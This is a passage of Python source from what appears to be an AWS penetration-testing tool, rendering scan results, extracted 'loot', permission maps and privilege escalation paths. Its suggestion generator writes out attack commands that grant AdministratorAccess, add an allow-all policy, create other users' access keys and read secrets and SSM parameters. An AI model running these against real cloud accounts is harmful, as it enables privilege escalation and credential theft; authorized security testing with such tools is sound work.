    t.add_column("Denied", justify="right", width=8)
    t.add_column("Error", justify="right", width=6)
    t.add_column("Status", min_width=14)

    for name in sorted(results.keys()):
        r = results[name]
        if r.ok == r.total:
            st, ns = "[bold green]FULL ACCESS[/bold green]", "bold green"
        elif r.ok > 0:
            st, ns = "[bold yellow]PARTIAL[/bold yellow]", "bold yellow"
        else:
            st, ns = "[dim red]NO ACCESS[/dim red]", "dim red"
        t.add_row(
            f"[{ns}]{name}[/{ns}]", str(r.total),
            f"[green]{r.ok}[/green]" if r.ok else "[dim]0[/dim]",
            f"[red]{r.denied}[/red]" if r.denied else "[dim]0[/dim]",
            f"[yellow]{r.errors}[/yellow]" if r.errors else "[dim]0[/dim]",
            st,
        )
    con.print(t)

    tok = sum(r.ok for r in results.values())
    tdn = sum(r.denied for r in results.values())
    ter = sum(r.errors for r in results.values())
    tc = sum(r.total for r in results.values())
    con.print(f"\n  [bold green]{tok}[/bold green] ok / [bold red]{tdn}[/bold red] denied / "
              f"[bold yellow]{ter}[/bold yellow] errors / [bold cyan]{tc}[/bold cyan] total\n")


def _print_findings(findings):
    if not findings:
        con.print("[dim]No security findings.[/dim]\n")
        return
    t = Table(title=f"Security Findings ({len(findings)})", box=box.ROUNDED,
              border_style="bright_blue", header_style="bold cyan")
    t.add_column("Sev", width=10)
    t.add_column("Service", width=14)
    t.add_column("Resource", min_width=20)
    t.add_column("Finding", min_width=30)
    for f in findings:
        s = _SEV_STYLE.get(f.severity, "")
        t.add_row(f"[{s}]{f.severity}[/{s}]", f.service, f.resource, f.title)
    con.print(t)
    c = len([f for f in findings if f.severity == "CRITICAL"])
    h = len([f for f in findings if f.severity == "HIGH"])
    m = len([f for f in findings if f.severity == "MEDIUM"])
    lo = len([f for f in findings if f.severity == "LOW"])
    con.print(f"\n  [bold white on red] {c} CRITICAL [/bold white on red] "
              f"[bold red]{h} HIGH[/bold red] [bold yellow]{m} MEDIUM[/bold yellow] "
              f"[bold blue]{lo} LOW[/bold blue]\n")


def _print_loot_summary(loot_data):
    total = sum(len(v) for v in loot_data.values())
    if total == 0:
        con.print("[dim]No loot extracted.[/dim]\n")
        return
    t = Table(title=f"Loot ({total} items)", box=box.ROUNDED,
              border_style="bright_blue", header_style="bold cyan")
    t.add_column("Source", style="bold", min_width=20)
    t.add_column("Items", justify="right", width=8)
    t.add_column("Readable", justify="right", width=10)
    for src in sorted(loot_data.keys()):
        items = loot_data[src]
        readable = len([i for i in items if i.get("Readable") is True])
        t.add_row(src,
                  f"[green]{len(items)}[/green]" if items else "[dim]0[/dim]",
                  f"[green]{readable}[/green]" if readable else "[dim]0[/dim]")
    con.print(t)
    con.print()


def _print_recon(recon_data):
    """Display the identity permission map, assumable roles, and next steps."""
    if not recon_data:
        return

    con.print(f"\n[bold cyan]{'-' * 50}[/bold cyan]")
    con.print(f"[bold cyan]IDENTITY PERMISSION MAP[/bold cyan]\n")

    ptype = recon_data.get("Type", "?")
    principal = recon_data.get("Principal", "?")
    account = recon_data.get("Account", "?")

    con.print(f"  [dim]identity:[/dim]  [bold]{ptype}/{principal}[/bold]")
    con.print(f"  [dim]account:[/dim]   [bold]{account}[/bold]")
    con.print(f"  [dim]arn:[/dim]       [bold]{recon_data.get('Arn', '?')}[/bold]")

    groups = recon_data.get("Groups", [])
    con.print(f"  [dim]groups:[/dim]    [bold]{', '.join(groups) if groups else '(none)'}[/bold]")

    # display policies
    policies = recon_data.get("Policies", [])
    if policies:
        con.print(f"\n  [bold green]Effective Policies ({len(policies)}):[/bold green]")
        for pol in policies:
            pname = pol["Name"]
            pol_type = pol["Type"]
            attached_to = pol.get("AttachedTo", "")

            badge_color = {"inline": "yellow", "aws-managed": "blue"}.get(pol_type, "cyan")
            label = {"inline": "inline", "aws-managed": "AWS managed"}.get(pol_type, "customer managed")

            con.print(f"\n    [{badge_color}]■[/{badge_color}] [bold]{pname}[/bold] "
                      f"[dim]({label}, on {attached_to})[/dim]")
            if pol.get("Arn"):
                con.print(f"      [dim]{pol['Arn']}[/dim]")

            for stmt in pol.get("Statements", []):
                _print_statement(stmt, indent=6)

            alt_versions = pol.get("AlternateVersions", [])
            if alt_versions:
                con.print(f"      [bold yellow]+ {len(alt_versions)} other version(s) available:[/bold yellow]")
                for av in alt_versions:
                    con.print(f"        [yellow]v{av['VersionId']}[/yellow]")
                    for stmt in av.get("Statements", []):
                        _print_statement(stmt, indent=10)
    else:
        con.print(f"\n  [dim]No policies enumerated (insufficient IAM permissions)[/dim]")

    # display assumable roles
    roles = recon_data.get("AssumableRoles", [])
    if roles:
        con.print(f"\n  [bold red]Assumable Roles ({len(roles)}):[/bold red]")
        for role in roles:
            rname = role.get("RoleName", "?")
            desc = role.get("Description", "")
            reason = role.get("Reason", "")

            con.print(f"\n    [red]■[/red] [bold]{rname}[/bold]" +
                      (f" [dim]— {desc}[/dim]" if desc else ""))
            con.print(f"      [dim]why: {reason}[/dim]")
            con.print(f"      [dim]{role.get('Arn', '')}[/dim]")

            for pol in role.get("Policies", []):
                pol_type = pol.get("Type", "")
                con.print(f"      [bold]{pol['Name']}[/bold] [dim]({pol_type})[/dim]")
                for stmt in pol.get("Statements", []):
                    _print_statement(stmt, indent=8)

    # display privilege escalation paths
    privesc = recon_data.get("PrivescPaths", [])
    if privesc:
        con.print(f"\n  [bold white on red] PRIVILEGE ESCALATION PATHS ({len(privesc)}) [/bold white on red]")
        for p in privesc:
            sev = p["Severity"]
            sev_style = {"CRITICAL": "bold white on red", "HIGH": "bold red"}.get(sev, "bold yellow")
            via = f" [dim](via role {p['ViaRole']})[/dim]" if p.get("ViaRole") else ""

            con.print(f"\n    [{sev_style}]{sev}[/{sev_style}] [bold]{p['Name']}[/bold]{via}")
            con.print(f"      [dim]{p['Description']}[/dim]")
            con.print(f"      action: [bold]{p['Action']}[/bold] [dim](in policy '{p['ViaPolicy']}')[/dim]")

            resources = p.get("Resources", [])
            if resources:
                for res in resources[:3]:
                    con.print(f"      [dim]→ {res}[/dim]")

            # show alternate versions for SetDefaultPolicyVersion
            alt_versions = p.get("AlternateVersions", [])
            if alt_versions:
                con.print(f"      [bold yellow]Available policy versions to switch to:[/bold yellow]")
                for av in alt_versions:
                    con.print(f"        [yellow]■[/yellow] [bold]{av['PolicyName']}[/bold] "
                              f"version [bold]{av['VersionId']}[/bold]")
                    for stmt in av.get("Statements", []):
                        _print_statement(stmt, indent=10)

    # generate and display next steps
    suggestions = _generate_suggestions(recon_data)
    if suggestions:
        con.print(f"\n  [bold yellow]Suggested Next Steps:[/bold yellow]")
        for s in suggestions:
            con.print(f"    [yellow]→[/yellow] [bold]{s}[/bold]")

    con.print()


def _print_statement(stmt, indent=6):
    """Print a single policy statement with actions and resources."""
    pad = " " * indent
    effect = stmt["Effect"]
    actions = stmt.get("Actions", [])
    resources = stmt.get("Resources", [])
    cond = " [dim](conditional)[/dim]" if stmt.get("Condition") else ""

    if effect == "Allow":
        action_str = ", ".join(actions[:6])
        if len(actions) > 6:
            action_str += f" [dim](+{len(actions) - 6} more)[/dim]"
        con.print(f"{pad}[green]Allow:{cond}[/green] {action_str}")
        for res in resources[:4]:
            con.print(f"{pad}  [dim]→ {res}[/dim]")
        if len(resources) > 4:
            con.print(f"{pad}  [dim]→ (+{len(resources) - 4} more)[/dim]")
    elif effect == "Deny":
        con.print(f"{pad}[red]Deny:{cond}[/red] {', '.join(actions[:6])}")
        for res in resources[:2]:
            con.print(f"{pad}  [dim]→ {res}[/dim]")


def _generate_suggestions(recon_data):
    """Generate actionable next-step commands from the permission map."""
    suggestions = []
    seen = set()

    # privilege escalation commands
    for p in recon_data.get("PrivescPaths", []):
        action = p["Action"]
        resources = p.get("Resources", [])
        via_role = p.get("ViaRole", "")
        note = f" (after assuming {via_role})" if via_role else ""

        if action == "iam:SetDefaultPolicyVersion":
            for av in p.get("AlternateVersions", []):
                cmd = (f"aws iam set-default-policy-version --policy-arn {av['PolicyArn']} "
                       f"--version-id {av['VersionId']}{note}")
                if cmd not in seen:
                    suggestions.append(cmd)
                    seen.add(cmd)
        elif action == "iam:AttachUserPolicy":
            for res in resources:
                if ":user/" in res:
                    user = res.rsplit("/", 1)[-1]
                    cmd = (f"aws iam attach-user-policy --user-name {user} "
                           f"--policy-arn arn:aws:iam::aws:policy/AdministratorAccess{note}")
                    if cmd not in seen:
                        suggestions.append(cmd)
                        seen.add(cmd)
        elif action == "iam:AttachRolePolicy":
            for res in resources:
                if ":role/" in res:
                    role = res.rsplit("/", 1)[-1]
                    cmd = (f"aws iam attach-role-policy --role-name {role} "
                           f"--policy-arn arn:aws:iam::aws:policy/AdministratorAccess{note}")
                    if cmd not in seen:
                        suggestions.append(cmd)
                        seen.add(cmd)
        elif action == "iam:PutUserPolicy":
            for res in resources:
                if ":user/" in res:
                    user = res.rsplit("/", 1)[-1]
                    cmd = (f"aws iam put-user-policy --user-name {user} --policy-name escalate "
                           f"--policy-document '{{\"Version\":\"2012-10-17\",\"Statement\":[{{\"Effect\":\"Allow\",\"Action\":\"*\",\"Resource\":\"*\"}}]}}'{note}")
                    if cmd not in seen:
                        suggestions.append(cmd)
                        seen.add(cmd)
        elif action == "iam:CreateAccessKey":
            for res in resources:
                if ":user/" in res:
                    user = res.rsplit("/", 1)[-1]
                    cmd = f"aws iam create-access-key --user-name {user}{note}"
                    if cmd not in seen:
                        suggestions.append(cmd)
                        seen.add(cmd)

    # suggest assuming each discoverable role
    for role in recon_data.get("AssumableRoles", []):
        arn = role.get("Arn", "")
        if arn:
            cmd = f"aws sts assume-role --role-arn {arn} --role-session-name awsault"
            if cmd not in seen:
                suggestions.append(cmd)
                seen.add(cmd)

    # scan all reachable policies for interesting resource access
    all_stmts = []
    for pol in recon_data.get("Policies", []):
        for stmt in pol.get("Statements", []):
            if stmt["Effect"] == "Allow":
                all_stmts.append((stmt, None))
    for role in recon_data.get("AssumableRoles", []):
        rname = role.get("RoleName", "")
        for pol in role.get("Policies", []):
            for stmt in pol.get("Statements", []):
                if stmt["Effect"] == "Allow":
                    all_stmts.append((stmt, rname))

    for stmt, via_role in all_stmts:
        resources = stmt.get("Resources", [])
        note = f" (after assuming {via_role})" if via_role else ""

        for res in resources:
            if res == "*":
                continue

            # S3 bucket access
            if "s3:::" in res:
                bucket = res.split(":::")[-1].rstrip("/*")
                cmd = f"aws s3 ls s3://{bucket}{note}"
                if cmd not in seen:
                    suggestions.append(cmd)
                    seen.add(cmd)

            # Secrets Manager
            if ":secretsmanager:" in res and ":secret:" in res:
                secret_part = res.split(":secret:")[-1]
                # strip random suffix (6 chars after last hyphen)
                if "-" in secret_part:
                    parts = secret_part.rsplit("-", 1)
                    if len(parts) == 2 and len(parts[1]) == 6 and parts[1].isalnum():
                        secret_part = parts[0]
                cmd = f"aws secretsmanager get-secret-value --secret-id {secret_part}{note}"
                if cmd not in seen:
                    suggestions.append(cmd)
                    seen.add(cmd)

            # SSM parameters
            if ":ssm:" in res and ":parameter/" in res:
                param = "/" + res.split(":parameter/")[-1]
                cmd = f"aws ssm get-parameter --name {param} --with-decryption{note}"
                if cmd not in seen:
                    suggestions.append(cmd)
                    seen.add(cmd)

            # DynamoDB tables
            if ":dynamodb:" in res and ":table/" in res:
                table = res.split(":table/")[-1].split("/")[0]
                cmd = f"aws dynamodb scan --table-name {table} --max-items 10{note}"
                if cmd not in seen:
                    suggestions.append(cmd)
                    seen.add(cmd)

            # Lambda functions
            if ":lambda:" in res and ":function:" in res:
                fname = res.split(":function:")[-1].split(":")[0]
                cmd = f"aws lambda get-function --function-name {fname}{note}"
                if cmd not in seen:
                    suggestions.append(cmd)
                    seen.add(cmd)

    return suggestions


def _print_verbose(results):
    for name in sorted(results.keys()):
        sr = results[name]
        ok_calls = [c for c in sr.calls if c.status == "ok"]
        if not ok_calls:
            continue
        con.print(f"\n[bold cyan]{'-' * 50}[/bold cyan]")
        con.print(f"[bold cyan]{name.upper()}[/bold cyan]")
        for c in ok_calls:
            con.print(f"\n  [green]>[/green] [bold]{c.method}[/bold] [dim]({c.count} items)[/dim]")
            if c.data:
                txt = json.dumps(c.data, indent=2, default=scanner._serialize)
                lines = txt.split("\n")
                if len(lines) > 40:
                    con.print(f"[dim]{chr(10).join(lines[:40])}\n  ... ({len(lines) - 40} more lines)[/dim]")
                else:
                    con.print(f"[dim]{txt}[/dim]")


# ---------------------------------------------------------------------------
# Payload building and export
# ---------------------------------------------------------------------------

def _build_payload(meta, quick, deep_data=None, findings=None, loot_data=None):
    """Convert live scan objects into the dict format used by store and output."""
    payload = {"meta": meta}
    if quick:
        payload["services"] = {name: sr.to_dict() for name, sr in quick.items()}
    if deep_data:
        payload["deep"] = {k: v for k, v in deep_data.items() if v}
        # promote recon to top level for easier access in exports
        for k, v in deep_data.items():
            if k.startswith("iam_self") and v:
                payload["recon"] = v
                break
    if findings:
        payload["findings"] = [f.to_dict() for f in findings]
    if loot_data:
        payload["loot"] = loot_data
    return payload


def _export(filepath, data):
    """Write data to a file, choosing format based on extension."""
    ext = os.path.splitext(filepath)[1].lower()
    if ext == ".csv":
        formatters.save_csv(filepath, data)
    elif ext == ".html":
        formatters.save_html(filepath, data)
    else:
        formatters.save_json(filepath, data)
    con.print(f"  [green]Exported:[/green] {filepath}\n")
